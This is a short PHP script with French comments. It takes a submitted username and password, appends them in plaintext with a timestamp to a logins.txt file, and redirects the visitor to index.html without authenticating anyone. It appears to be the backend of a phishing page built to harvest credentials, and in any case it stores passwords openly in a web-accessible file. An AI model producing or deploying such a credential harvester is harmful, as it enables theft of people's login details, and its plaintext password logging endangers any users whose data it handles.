<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? 'inconnu';
    $password = $_POST['password'] ?? 'inconnu';

    $line = "Nom d'utilisateur: $username | Mot de passe: $password | Date: " . date('Y-m-d H:i:s') . PHP_EOL;

    // Ajoute la ligne dans le fichier logins.txt (créé s'il n'existe pas)
    file_put_contents('logins.txt', $line, FILE_APPEND | LOCK_EX);

    // Redirige vers la page de connexion avec un message ou vers une autre page
    header('Location: index.html'); // remplace index.html par ta page principale
    exit();
}
?>
